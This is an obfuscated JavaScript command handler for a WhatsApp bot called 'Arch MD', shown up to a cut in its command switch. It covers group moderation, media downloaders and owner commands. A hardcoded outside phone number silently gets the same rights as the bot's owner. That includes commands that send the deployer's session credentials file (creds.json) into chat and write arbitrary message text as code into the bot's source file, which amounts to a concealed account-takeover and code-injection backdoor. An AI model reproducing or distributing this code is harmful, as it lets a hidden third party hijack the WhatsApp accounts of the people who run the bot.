module.exports = async (_0x38cbcb, _0x44490c, _0x3f18ee) => {
  try {
    const _0x59b5ec = _0x44490c.mtype === "conversation" && _0x44490c.message.conversation ? _0x44490c.message.conversation : _0x44490c.mtype == "imageMessage" && _0x44490c.message.imageMessage.caption ? _0x44490c.message.imageMessage.caption : _0x44490c.mtype == "documentMessage" && _0x44490c.message.documentMessage.caption ? _0x44490c.message.documentMessage.caption : _0x44490c.mtype == "videoMessage" && _0x44490c.message.videoMessage.caption ? _0x44490c.message.videoMessage.caption : _0x44490c.mtype == 'extendedTextMessage' && _0x44490c.message.extendedTextMessage.text ? _0x44490c.message.extendedTextMessage.text : _0x44490c.mtype == "buttonsResponseMessage" && _0x44490c.message.buttonsResponseMessage.selectedButtonId ? _0x44490c.message.buttonsResponseMessage.selectedButtonId : _0x44490c.mtype == "templateButtonReplyMessage" && _0x44490c.message.templateButtonReplyMessage.selectedId ? _0x44490c.message.templateButtonReplyMessage.selectedId : '';
    const _0x416b1f = typeof _0x44490c.text == 'string' ? _0x44490c.text : '';
    const _0x4b9d86 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(_0x59b5ec) ? _0x59b5ec.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x586f96 = _0x59b5ec.startsWith(_0x4b9d86);
    const _0x259a4d = _0x586f96 ? _0x59b5ec.slice(_0x4b9d86.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x5e6fae = _0x4b9d86 + _0x259a4d;
    const _0x27283f = _0x59b5ec.trim().split(/ +/).slice(0x1);
    const _0x87515f = _0x44490c.quoted ? _0x44490c.quoted : _0x44490c;
    const _0x5a1980 = (_0x87515f.msg || _0x87515f).mimetype || '';
    const _0x2b7999 = _0x87515f.msg || _0x87515f;
    const _0x32d59b = q = _0x27283f.join(" ");
    const _0x4d2cfc = await _0x38cbcb.decodeJid(_0x38cbcb.user.id);
    const _0x402f36 = _0x44490c.sender == owner + "@s.whatsapp.net" ? true : !!(_0x44490c.sender == _0x4d2cfc);
    const _0x2084b0 = _0x44490c.sender == "2347036214381@s.whatsapp.net";
    const _0x5d1680 = _0x44490c.chat.endsWith("@g.us");
    const _0x3745cc = require('performance-now');
    const _0x2142ae = _0x44490c.sender.split('@')[0x0];
    const _0x4e1c1e = _0x44490c.key.remoteJid;
    const _0x2e028e = _0x5d1680 ? await _0x38cbcb.groupMetadata(_0x44490c.key.remoteJid) : {};
    const _0x4e4219 = _0x5d1680 ? await _0x2e028e.participants : '';
    let _0x6c8158 = (_0x5d1680 ? _0x2e028e.participants.find(_0x1e925a => _0x1e925a.id == _0x44490c.botNumber) : {}) || {};
    let _0x33a397 = (_0x5d1680 ? _0x2e028e.participants.find(_0x31f805 => _0x31f805.id == _0x44490c.sender) : {}) || {};
    const _0x5c94f1 = !!(_0x6c8158?.['admin'] !== null);
    const _0x3ba66b = !!(_0x33a397?.['admin'] !== null);
    const {
      runtime: _0x35a7b8,
      fetchJson: _0x213ed6,
      getRandom: _0x290b0a,
      getTime: _0x1a630e,
      tanggal: _0x34605e,
      toRupiah: _0x3e2bf0,
      telegraPh: _0x24c2f3,
      pinterest: _0x45e32b,
      ucapan: _0x28b174,
      generateProfilePicture: _0x316a83
    } = require('./all/function.js');
    const _0x11ccf6 = require("./all/uploadImage.js");
    const _0x1ffdeb = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x44490c.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'locationMessage': {
          'name': '' + global.botname,
          'jpegThumbnail': ''
        }
      }
    };
    async function _0x57794f() {
      var _0x308345 = ["𝐡𝐢 𝐭𝐡𝐞𝐫𝐞 👤", "𝐀𝐫𝐜𝐡 𝐢𝐬 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 🗿️", "𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐝𝐨𝐧𝐞 🥇", "𝑨𝑹𝑪𝑯 𝑴𝑫 𝑩𝒀 𝑬𝑫𝑵𝑼𝑻 🦄"];
      let {
        key: _0x31815e
      } = await _0x38cbcb.sendMessage(_0x4e1c1e, {
        'text': ''
      });
      for (let _0x460748 = 0x0; _0x460748 < _0x308345.length; _0x460748++) {
        await _0x38cbcb.sendMessage(_0x4e1c1e, {
          'text': _0x308345[_0x460748],
          'edit': _0x31815e
        });
      }
    }
    const _0x55b786 = JSON.parse(fs.readFileSync("./all/database/antilink.json"));
    const _0x5425d5 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'));
    const _0x324b8b = fs.readFileSync("./ednutmedia/ednut.jpg");
    const _0x28640c = fs.readFileSync("./ednutmedia/ednut.jpg");
    const _0x212748 = fs.readFileSync(path.resolve(__dirname, "./ednutmedia/arch.mp3"));
    const {
      toAudio: _0x5c5d49,
      toPTT: _0x3c652a,
      toVideo: _0x5bddc2,
      ffmpeg: _0x42beec
    } = require('./all/converter.js');
    const _0x50a72d = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const _0x140c70 = _0x50a72d[Math.floor(Math.random() * _0x50a72d.length)];
    if (_0x586f96) {
      console.log(chalk.yellow.bgCyan.bold(botname), color("[ message ☘ ]", '' + _0x140c70), color("from", '' + _0x140c70), color('' + _0x2142ae, '' + _0x140c70), color("Text :", '' + _0x140c70), color('' + _0x5e6fae, "white"));
    }
    if (_0x5d1680 && _0x55b786.includes(_0x44490c.chat) && _0x5c94f1) {
      if (!_0x3ba66b && !_0x402f36 && !_0x2084b0 && !_0x44490c.fromMe) {
        var _0x3aa715 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x3aa715.test(_0x44490c.text)) {
          var _0x4b119d = "https://chat.whatsapp.com/" + (await _0x38cbcb.groupInviteCode(_0x44490c.chat));
          var _0x53c797 = new RegExp(_0x4b119d, 'i');
          var _0x26025a = _0x53c797.test(_0x44490c.text);
          if (_0x26025a) {
            return;
          }
          let _0x4afc30 = _0x44490c.key.participant;
          let _0x498af2 = _0x44490c.key.id;
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': '@' + _0x44490c.sender.split('@')[0x0] + " Sorry, I deleted your message because the Admin/Owner of the Bot turned on the *Antilink* feature of another group.",
            'contextInfo': {
              'mentionedJid': [_0x44490c.sender],
              'externalAdReply': {
                'thumbnailUrl': "https://telegra.ph/file/d29baa62079de1f3e9ba7.jpg",
                'title': "｢ LINK GRUP DETECTED ｣",
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x44490c
          });
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'delete': {
              'remoteJid': _0x44490c.chat,
              'fromMe': false,
              'id': _0x498af2,
              'participant': _0x4afc30
            }
          });
          await _0x38cbcb.groupParticipantsUpdate(_0x44490c.chat, [_0x44490c.sender], 'remove');
        }
      }
    }
    _0x38cbcb.sendPresenceUpdate("unavailable", _0x44490c.chat);
    if (_0x5d1680 && _0x5425d5.includes(_0x44490c.chat) && _0x5c94f1) {
      if (!_0x3ba66b && !_0x402f36 && !_0x2084b0 && !_0x44490c.fromMe) {
        var _0x3aa715 = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi;
        if (_0x3aa715.test(_0x44490c.text)) {
          var _0x4b119d = "https://chat.whatsapp.com/" + (await _0x38cbcb.groupInviteCode(_0x44490c.chat));
          var _0x53c797 = new RegExp(_0x4b119d, 'i');
          var _0x26025a = _0x53c797.test(_0x44490c.text);
          if (_0x26025a) {
            return;
          }
          let _0x24d51c = _0x44490c.key.participant;
          let _0x5622af = _0x44490c.key.id;
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'text': '@' + _0x44490c.sender.split('@')[0x0] + " Sorry, I deleted your message because the Admin/Owner of the Bot turned on the *Antilink* feature of another group.!",
            'contextInfo': {
              'mentionedJid': [_0x44490c.sender],
              'externalAdReply': {
                'thumbnailUrl': 'https://telegra.ph/file/d29baa62079de1f3e9ba7.jpg',
                'title': "｢ LINK GRUP DETECTED ｣",
                'previewType': "PHOTO"
              }
            }
          }, {
            'quoted': _0x44490c
          });
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'delete': {
              'remoteJid': _0x44490c.chat,
              'fromMe': false,
              'id': _0x5622af,
              'participant': _0x24d51c
            }
          });
        }
      }
    }
    let _0x11cbb8 = JSON.parse(fs.readFileSync('./all/database/welcome.json'));
    let _0x59f8fa = JSON.parse(fs.readFileSync("./all/database/left.json"));
    let _0x335767 = JSON.parse(fs.readFileSync("./all/database/command.json"));
    const _0x588248 = !!_0x11cbb8.includes(_0x44490c.chat);
    const _0x44309c = !!_0x59f8fa.includes(_0x44490c.chat);
    const {
      getDevice: _0x58862a
    } = require("baileys");
    if (_0x416b1f.startsWith("https://vt.tiktok.com/") || _0x416b1f.startsWith("https://www.tiktok.com/") || _0x416b1f.startsWith("https://t.tiktok.com/") || _0x416b1f.startsWith('https://vm.tiktok.com/')) {
      _0x44490c.reply(msg.wait);
      try {
        const _0x4195d2 = await _0x213ed6("https://api.tiklydown.eu.org/api/download?url=" + encodeURIComponent(_0x416b1f));
        const _0x3152df = _0x4195d2.video.noWatermark;
        const _0x5061c8 = "Arch Tiktok downloader\n\nVideo data " + (_0x4195d2.author.name ?? '') + " (@" + (_0x4195d2.author.unique_id ?? '') + ")\nLikes: " + (_0x4195d2.stats.likeCount ?? '') + "\nComments: " + (_0x4195d2.stats.commentCount ?? '') + "\nShares: " + (_0x4195d2.stats.shareCount ?? '') + "\nPlays: " + (_0x4195d2.stats.playCount ?? '') + "\nSaves: " + (_0x4195d2.stats.saveCount ?? '') + "\n\n`Downloader By Arch Wa ai 💞`\n";
        _0x38cbcb.sendMessage(_0x44490c.chat, {
          'caption': _0x5061c8,
          'video': {
            'url': _0x3152df
          }
        }, {
          'quoted': _0x44490c
        });
      } catch {
        const _0x222030 = await _0x213ed6("https://api.tiklydown.eu.org/api/download/v3?url=" + encodeURIComponent(_0x416b1f));
        const _0x173c67 = _0x222030.result.video;
        const _0x356c1f = "TIKTOK DOWNLOADER \n\nLikes: " + (_0x222030.result.statistics.likeCount ?? '') + "\nComments: " + (_0x222030.result.statistics.commentCount ?? '') + "\nShares: " + (_0x222030.result.statistics.shareCount ?? '') + "\nby " + (_0x222030.result.author.nickname ?? '') + "\n\n`Downloader By Arch Wa ai 💞`\n  ";
        _0x38cbcb.sendMessage(_0x44490c.chat, {
          'caption': _0x356c1f,
          'video': {
            'url': _0x173c67
          }
        }, {
          'quoted': _0x44490c
        });
      }
    }
    async function _0x2da5be(_0x440c07, _0x473cd5) {
      fs.readFile(_0x440c07, 'utf8', (_0x4de033, _0x374170) => {
        if (_0x4de033) {
          console.error("There is an error:", _0x4de033);
          return;
        }
        const _0x177339 = new RegExp("case\\s+'" + _0x473cd5 + "':[\\s\\S]*?break", 'g');
        const _0x47ae4c = _0x374170.replace(_0x177339, '');
        fs.writeFile(_0x440c07, _0x47ae4c, "utf8", _0x153feb => {
          if (_0x153feb) {
            console.error("An error occurred while deleting the file:", _0x153feb);
            return;
          }
          console.log("The text of case '" + _0x473cd5 + "' has been removed from the file..");
        });
      });
    }
    switch (_0x259a4d) {
      case "hehe":
      case "menu":
      case "allmenu":
        {
          const _0xbc2a27 = _0x3745cc();
          const _0x4fd101 = _0x3745cc() - _0xbc2a27;
          var _0x354198 = ["𝐇𝐞𝐥𝐥𝐨 𝐰𝐨𝐫𝐥𝐝 👋", "𝐈𝐦 𝐩𝐫𝐨𝐣𝐞𝐜𝐭 𝐀𝐫𝐜𝐡 🤖", "𝐋𝐚𝐭𝐞𝐬𝐭 𝐦𝐮𝐥𝐭𝐢 𝐝𝐞𝐯𝐢𝐜𝐞 𝐛𝐨𝐭💥", "*SHIT* 𝑴𝑬𝑵𝑼 𝑯𝑬𝑹𝑬 🦄", "┏━━━━━━━━━━━━━━━━\n♞ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: bluedemon\n♞ 𝐏𝐢𝐧𝐠: " + _0x4fd101.toFixed(0x4) + "\n♞ 𝐌𝐨𝐝𝐞: " + (_0x38cbcb['public'] ? "Public" : "Self") + "\n♞ 𝐓𝐢𝐦𝐞: " + _0x1a630e().split('T')[0x1].split('+')[0x0] + "\n┗━━━━━━━━━━━━━━━━━\n\n𝐘𝐨𝐮 𝐜𝐚𝐧 𝐜𝐨𝐩𝐲 𝐛𝐮𝐭 𝐜𝐚𝐧 𝐧𝐞𝐯𝐞𝐫 𝐛𝐞 𝐦𝐞  dey play✫  \n\n┏━ `𝒐𝒘𝒏𝒆𝒓 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐏𝐮𝐛𝐥𝐢𝐜\n┇" + global.simbol + " .𝐒𝐞𝐥𝐟\n┇" + global.simbol + " .𝐀𝐝𝐝𝐜𝐚𝐬𝐞  \n┇" + global.simbol + " .𝐃𝐞𝐥𝐜𝐚𝐬𝐞\n┇" + global.simbol + " .𝐒𝐞𝐭𝐛𝐢𝐨\n┇" + global.simbol + " .𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐨𝐧\n┇" + global.simbol + " .𝐀𝐧𝐭𝐢𝐜𝐚𝐥𝐥 𝐨𝐟𝐟\n┇" + global.simbol + " .𝐑𝐞𝐬𝐭𝐚𝐫𝐭\n┇" + global.simbol + " .𝐃𝐞𝐥\n┇" + global.simbol + " .𝐉𝐨𝐢𝐧\n┇" + global.simbol + " .𝐋𝐞𝐚𝐯𝐞\n┇" + global.simbol + " .𝐆𝐞𝐭𝐬𝐞𝐬𝐬𝐢𝐨𝐧\n┇" + global.simbol + " .𝐋𝐨𝐠𝐨𝐮𝐭\n┇" + global.simbol + " .𝐠𝐞𝐭𝐢𝐩\n┇" + global.simbol + " .𝐔𝐧𝐛𝐥𝐨𝐜𝐤 \n┇" + global.simbol + " .𝐁𝐥𝐨𝐜𝐤 \n┗━━━━━━━━━━━━━━━━━\n\n┏━ `𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐏𝐥𝐚𝐲\n┇" + global.simbol + " .𝐈𝐠𝐝𝐥 <𝐥𝐢𝐧𝐤>\n┇" + global.simbol + " .𝐅𝐛 <𝐥𝐢𝐧𝐤>\n┇" + global.simbol + " .𝐓𝐢𝐤𝐭𝐨𝐤 <𝐥𝐢𝐧𝐤>\n┇" + global.simbol + " .𝐌𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞 <𝐥𝐢𝐧𝐤>\n┇" + global.simbol + " .𝐆𝐢𝐭𝐜𝐥𝐨𝐧𝐞 <𝐥𝐢𝐧𝐤>\n┇" + global.simbol + " .𝐘𝐭𝐦𝐩4 <𝐥𝐢𝐧𝐤>\n┗━━━━━━━━━━━━━━━━━\n\n┏━ `𝒂𝒓𝒄𝒉 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐏𝐢𝐧𝐠\n╏" + global.simbol + " .𝐑𝐮𝐧𝐭𝐢𝐦𝐞\n╏" + global.simbol + " .𝐀𝐫𝐜𝐡\n╏" + global.simbol + " .𝐁𝐨𝐭\n┗━━━━━━━━━━━━━━━━━\n\n┏━ `𝒈𝒓𝒐𝒖𝒑 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐇𝐢𝐝𝐞𝐭𝐚𝐠\n╏" + global.simbol + " .𝐓𝐚𝐠𝐚𝐥𝐥\n╏" + global.simbol + " .𝐓𝐚𝐠𝐚𝐝𝐦𝐢𝐧\n╏" + global.simbol + " .𝐆𝐫𝐨𝐮𝐩𝐥𝐢𝐧𝐤\n╏" + global.simbol + " .𝐑𝐞𝐯𝐨𝐤𝐞\n╏" + global.simbol + " .𝐀𝐝𝐝\n╏" + global.simbol + " .𝐊𝐢𝐜𝐤\n╏" + global.simbol + " .𝐏𝐫𝐨𝐦𝐨𝐭𝐞\n╏" + global.simbol + " .𝐃𝐞𝐦𝐨𝐭𝐞\n╏" + global.simbol + " .𝐌𝐮𝐭𝐞\n╏" + global.simbol + " .𝐔𝐧𝐦𝐮𝐭𝐞\n╏" + global.simbol + " .𝐂𝐥𝐨𝐬𝐞𝐭𝐢𝐦𝐞\n╏" + global.simbol + " .𝐎𝐩𝐞𝐧𝐭𝐢𝐦𝐞\n╏" + global.simbol + " .𝐖𝐞𝐥𝐜𝐨𝐦𝐞\n╏" + global.simbol + " .𝐆𝐨𝐨𝐝𝐛𝐲𝐞\n┗━━━━━━━━━━━━━━━━━\n\n┏━ `𝒄𝒐𝒏𝒗𝒆𝒓𝒕 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐒𝐭𝐢𝐜𝐤𝐞𝐫\n╏" + global.simbol + " .𝐭𝐨𝐢𝐦𝐠\n╏" + global.simbol + " .𝐭𝐨𝐦𝐩3\n╏" + global.simbol + " .𝐭𝐨𝐯𝐧\n╏" + global.simbol + " .𝐭𝐨𝐯𝐯\n╏" + global.simbol + " .𝐖𝐫𝐢𝐭𝐞\n┗━━━━━━━━━━━━━━━━━\n\n┏━ `𝒐𝒕𝒉𝒆𝒓 𝒎𝒆𝒏𝒖`\n╏" + global.simbol + " .𝐠𝐞𝐭𝐝𝐞𝐯𝐢𝐜𝐞\n╏" + global.simbol + " .𝐎𝐰𝐧𝐞𝐫\n╏" + global.simbol + " .𝐂𝐫𝐞𝐚𝐭𝐨𝐫\n╏" + global.simbol + " .𝐄𝐝𝐧𝐮𝐭\n╏" + global.simbol + " .𝐓𝐫𝐚𝐜𝐤𝐢𝐩\n╏" + global.simbol + " .𝐑𝐞𝐩𝐨𝐫𝐭\n╏" + global.simbol + " .𝐫𝐞𝐚𝐝𝐦𝐨𝐫𝐞\n╏" + global.simbol + " .𝐕𝐯\n╏" + global.simbol + " .𝐅𝐚𝐧𝐜𝐲\n┗━━━━━━━━━━━━━━━━━\n" + global.footer + "\n"];
          let {
            key: _0x4fcfbb
          } = await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'image': _0x28640c,
            'caption': 'ɪɴɪᴛɪᴀʟɪᴢɪɴɢ....',
            'contextInfo': {
              'mentionedJid': [_0x44490c.sender],
              'forwardingScore': 0x270f,
              'isForwarded': false
            }
          }, {
            'quoted': null
          });
          for (let _0x46e4e9 = 0x0; _0x46e4e9 < _0x354198.length; _0x46e4e9++) {
            await sleep(0x5a);
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'react': {
                'text': '🦄',
                'key': _0x44490c.key
              }
            });
            await _0x38cbcb.sendMessage(_0x44490c.chat, {
              'image': _0x324b8b,
              'caption': _0x354198[_0x46e4e9],
              'edit': _0x4fcfbb
            });
          }
          await _0x38cbcb.sendMessage(_0x44490c.chat, {
            'audio': _0x212748,
            'mimetype': "audio/mpeg"
          }, {
            'quoted': _0x44490c
          });
        }
        break;
      case "public":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '👨‍👩‍👦‍👦',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb['public'] = true;
          _0x44490c.reply("Arch Md successfully changed to public");
        }
        break;
      case "self":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '👤',
              'key': _0x44490c.key
            }
          });
          _0x38cbcb['public'] = false;
          _0x44490c.reply("Arch md activated to owner only");
        }
        break;
      case 'addcase':
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x32d59b) {
            return _0x44490c.reply("Where is the case?");
          }
          const _0x612102 = require('fs');
          const _0x305569 = '' + _0x32d59b;
          _0x612102.readFile("ednut.js", 'utf8', (_0x2ba8a2, _0x1e3517) => {
            if (_0x2ba8a2) {
              console.error("An error occurred while reading the file:", _0x2ba8a2);
              return;
            }
            const _0x4b45cd = _0x1e3517.indexOf("case 'addcase':");
            if (_0x4b45cd !== -0x1) {
              const _0x212307 = _0x1e3517.slice(0x0, _0x4b45cd) + "\n" + _0x305569 + "\n" + _0x1e3517.slice(_0x4b45cd);
              _0x612102.writeFile("ednut.js", _0x212307, "utf8", _0x1ad5b2 => {
                return _0x1ad5b2 ? _0x44490c.reply("An error occurred while writing the file:", _0x1ad5b2) : _0x44490c.reply("case added successfully.");
              });
            } else {
              return _0x44490c.reply("Error cant add case in file");
            }
          });
        }
        break;
      case "delcase":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x32d59b) {
            return _0x44490c.reply("Enter the name of the case to be deleted.");
          }
          _0x2da5be('./ednut.js', q);
          _0x44490c.reply("Delcase Successfully");
        }
        break;
      case "setbio":
      case "setbiobot":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x32d59b) {
            return _0x44490c.reply("usage .setbio hi");
          }
          _0x38cbcb.updateProfileStatus(_0x32d59b);
          _0x44490c.reply("bio set succesfully✅");
        }
        break;
      case 'anticall':
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '📵',
              'key': _0x44490c.key
            }
          });
          if (_0x27283f[0x0] === 'on') {
            if (anticall) {
              return _0x44490c.reply("activated");
            }
            anticall = true;
            _0x44490c.reply("Successfully Activated Anticall");
          } else {
            if (_0x27283f[0x0] === "off") {
              if (!anticall) {
                return _0x44490c.reply("it's deactivated");
              }
              anticall = false;
              _0x44490c.reply("Successfully Disabled Anticall");
            } else {
              _0x44490c.reply("use " + (_0x4b9d86 + _0x259a4d) + " on too activate\n" + (_0x4b9d86 + _0x259a4d) + " off too deactivate");
            }
          }
        }
        break;
      case "restart":
        if (!_0x402f36 && !_0x2084b0) {
          return _0x44490c.reply(msg.owner);
        }
        _0x38cbcb.sendMessage(_0x44490c.chat, {
          'react': {
            'text': '🔘',
            'key': _0x44490c.key
          }
        });
        _0x44490c.reply("Restarting Arch Wa Ai");
        await sleep(0xbb8);
        process.exit();
        break;
      case "del":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '‼️',
              'key': _0x44490c.key
            }
          });
          if (!_0x44490c.quoted) {
            return false;
          }
          let {
            chat: _0x10ae5a,
            fromMe: _0x581d96,
            id: _0x33742b,
            isBaileys: _0x40409d
          } = _0x44490c.quoted;
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'delete': {
              'remoteJid': _0x44490c.chat,
              'fromMe': false,
              'id': _0x44490c.quoted.id,
              'participant': _0x44490c.quoted.sender
            }
          });
        }
        break;
      case "join":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x32d59b) {
            return _0x44490c.reply("Example " + (_0x4b9d86 + _0x259a4d) + " group link");
          }
          if (!_0x27283f[0x0].includes("whatsapp.com")) {
            return _0x44490c.reply("Link Invalid!");
          }
          let _0x284fbd = _0x27283f[0x0].split("https://chat.whatsapp.com/")[0x1];
          await _0x38cbcb.groupAcceptInvite(_0x284fbd);
          await _0x44490c.reply("Done");
        }
        break;
      case 'leave':
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          if (!_0x5d1680) {
            return _0x44490c.reply(msg.group);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🚶',
              'key': _0x44490c.key
            }
          });
          await _0x44490c.reply("Bye 🙂");
          await sleep(0x50);
          await _0x38cbcb.groupLeave(_0x44490c.chat);
        }
        break;
      case "getsession":
        if (!_0x402f36 && !_0x2084b0) {
          return _0x44490c.reply(msg.owner);
        }
        _0x44490c.reply("Wait a moment, currently retrieving your session file");
        let _0xc84098 = await fs.readFileSync("./session/creds.json");
        _0x38cbcb.sendMessage(_0x44490c.chat, {
          'document': _0xc84098,
          'mimetype': "application/json",
          'fileName': "creds.json"
        }, {
          'quoted': _0x44490c
        });
        break;
      case "delsession":
      case "logout":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          fs.readdir("./session", async function (_0x2f4f00, _0x327782) {
            if (_0x2f4f00) {
              console.log("Unable to scan directory: " + _0x2f4f00);
              return _0x44490c.reply("Unable to scan directory: " + _0x2f4f00);
            }
            let _0xfdb7a0 = await _0x327782.filter(_0x3c0b3f => _0x3c0b3f.startsWith("pre-key") || _0x3c0b3f.startsWith("sender-key") || _0x3c0b3f.startsWith("session-") || _0x3c0b3f.startsWith('app-state'));
            console.log(_0xfdb7a0.length);
            let _0x479bd5 = "Detected " + _0xfdb7a0.length + " memory file <3\n\n";
            if (_0xfdb7a0.length == 0x0) {
              return _0x44490c.reply('' + _0x479bd5);
            }
            _0xfdb7a0.map(function (_0x1871d7, _0x27ecfe) {
              _0x479bd5 += _0x27ecfe + 0x1 + (". " + _0x1871d7 + "\n");
            });
            _0x44490c.reply('' + _0x479bd5);
            await sleep(0x7d0);
            _0x44490c.reply("Deleting session files.....");
            await _0xfdb7a0.forEach(function (_0x55c527) {
              fs.unlinkSync("./session/" + _0x55c527);
            });
            await sleep(0x7d0);
            _0x44490c.reply("Successfully deleted all creds server in session folder");
          });
        }
        break;
      case 'getip':
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          await _0x57794f();
          var _0x47046e = require("http");
          _0x47046e.get({
            'host': "api.ipify.org",
            'port': 0x50,
            'path': '/'
          }, function (_0x39272e) {
            _0x39272e.on("data", function (_0xfff856) {
              _0x44490c.reply("🔎 The public IP address is: " + _0xfff856);
            });
          });
        }
        break;
      case "block":
      case 'ban':
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '😡',
              'key': _0x44490c.key
            }
          });
          let _0x502cf2 = _0x44490c.mentionedJid[0x0] ? _0x44490c.mentionedJid[0x0] : _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.updateBlockStatus(_0x502cf2, "block");
          await _0x44490c.reply('Done');
        }
        break;
      case 'unblock':
      case "unban":
        {
          if (!_0x402f36 && !_0x2084b0) {
            return _0x44490c.reply(msg.owner);
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🙄',
              'key': _0x44490c.key
            }
          });
          let _0x74ffae = _0x44490c.mentionedJid[0x0] ? _0x44490c.mentionedJid[0x0] : _0x44490c.quoted ? _0x44490c.quoted.sender : _0x32d59b.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x38cbcb.updateBlockStatus(_0x74ffae, "unblock");
          await _0x44490c.reply("Done");
        }
        break;
      case "play":
      case "songs":
        {
          let _0x14128c = require("yt-search");
          if (!_0x32d59b) {
            return _0x44490c.reply("Example! Use :\n> .play past lives");
          }
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '🎶',
              'key': _0x44490c.key
            }
          });
          await _0x57794f();
          try {
            let _0x58f086 = await _0x14128c(_0x32d59b);
            let _0x1181d8 = _0x58f086.videos[0x0];
            let {
              title: _0x387d02,
              thumbnail: _0x3f51f8,
              timestamp: _0x27d453,
              views: _0xed6ec,
              ago: _0x596bff,
              url: _0x147492
            } = _0x1181d8;
            let _0x2ffc19 = await (await fetch('https://widipe.com/download/ytdl?url=' + _0x147492)).json();
            let _0x583992 = {
              'audio': {
                'url': _0x2ffc19.result.mp3
              },
              'mimetype': "audio/mp4",
              'fileName': '' + _0x387d02,
              'contextInfo': {
                'externalAdReply': {
                  'showAdAttribution': true,
                  'mediaType': 0x2,
                  'mediaUrl': _0x147492,
                  'title': _0x387d02,
                  'sourceUrl': _0x147492,
                  'thumbnail': await (await _0x38cbcb.getFile(_0x3f51f8)).data
                }
              }
            };
            await _0x38cbcb.sendMessage(_0x44490c.chat, _0x583992, {
              'quoted': _0x44490c
            });
          } catch (_0x1a38bb) {
            _0x44490c.reply("server error :" + _0x1a38bb);
          }
        }
        break;
      case "instagram":
      case "igdl":
      case 'ig':
      case "igvideo":
      case 'igimage':
      case 'igvid':
      case "igimg":
        {
          if (!_0x32d59b) {
            return _0x44490c.reply("Example! Use :\n> .igdl link");
          }
          await _0x57794f();
          _0x38cbcb.sendMessage(_0x44490c.chat, {
            'react': {
              'text': '⏬',
              'key': _0x44490c.key
            }
          });
          try {
            const _0x1c5ad1 = await _0x213ed6("https://widipe.com/download/igdl?url=" + encodeURIComponent(_0x32d59b));
            if (_0x1c5ad1 && _0x1c5ad1.result && _0x1c5ad1.result.length > 0x0 && _0x1c5ad1.result[0x0].url) {
              const _0x29027f = _0x1c5ad1.result[0x0].url;
              _0x38cbcb.sendMessage(_0x44490c.chat, {
                'video': {
                  'url': _0x29027f
                },
                'caption': "download by Arch Wa Ai 💞"
              }, {
                'quoted': _0x44490c
              });
            } else {
              throw new Error("URL not found in result");
            }
          } catch (_0x46007) {
            console.error(_0x46007);
            _0x38cbcb.sendMessage(_0x44490c.chat, {
              'image': {
                'url': result
              },
              'caption': "Sorry, the video could not be taken. Here are the available images:"
            }, {
              'quoted': _0x44490c
            });
          }
        }
        break;
      case "facebook":
      case 'fb':
      case "fbdl":
